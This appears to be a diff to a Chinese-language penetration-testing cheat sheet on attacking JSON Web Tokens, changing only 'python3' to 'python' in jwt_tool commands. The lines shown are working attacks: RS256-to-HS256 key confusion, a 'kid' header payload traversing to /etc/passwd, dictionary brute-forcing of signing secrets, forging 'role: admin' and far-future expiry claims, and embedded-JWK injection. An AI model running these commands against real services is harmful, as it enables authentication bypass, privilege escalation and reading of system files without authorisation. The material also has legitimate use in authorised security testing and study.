@@ -12,7 +12,7 @@
 # RS256 → HS256 密钥混淆
 # 如果服务端用 RS256 公钥做 HS256 验证
 # 可以把公钥当 HMAC 密钥来签名
-python3 jwt_tool.py <JWT> -X k -pk public.pem
+python jwt_tool.py <JWT> -X k -pk public.pem
 
 # kid 注入
 # {"alg":"HS256","kid":"../../../../etc/passwd"}
@@ -23,20 +23,20 @@ python3 jwt_tool.py <JWT> -X k -pk public.pem
 
 ```bash
 # 全面扫描
-python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"
+python jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"
 
 # 弱密钥爆破
-python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
+python jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
 
 # 声明篡改
-python3 jwt_tool.py <JWT> -I -pc role -pv admin
-python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999
+python jwt_tool.py <JWT> -I -pc role -pv admin
+python jwt_tool.py <JWT> -I -pc exp -pv 9999999999
 
 # RSA 密钥混淆
-python3 jwt_tool.py <JWT> -X k -pk public.pem
+python jwt_tool.py <JWT> -X k -pk public.pem
 
 # 嵌入 JWK
-python3 jwt_tool.py <JWT> -X i
+python jwt_tool.py <JWT> -X i
 ```
 
 ### 3. 手工 JWT 篡改
